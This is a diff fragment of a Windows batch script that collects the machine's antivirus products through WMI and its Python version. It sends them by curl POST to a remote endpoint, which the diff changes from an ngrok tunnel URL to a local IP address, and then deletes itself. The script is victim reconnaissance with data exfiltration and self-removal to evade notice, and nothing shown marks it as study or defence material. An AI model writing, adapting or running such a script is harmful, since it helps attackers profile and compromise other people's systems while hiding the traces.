@@ -6,5 +6,5 @@ for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusP
 echo Antivirus Information: %antivirus%
 for /f "delims=" %%b in ('python --version 2^>^&1') do set "python_version=%%b"
 echo Python Version: %python_version%
-curl --verbose --data "Antivirus = %antivirus% & PythonVersion = %python_version%" https://e977-197-35-34-224.ngrok-free.app
+curl --verbose --data "Antivirus = %antivirus% & PythonVersion = %python_version%" http://192.168.1.16:8000
 del "%~f0"
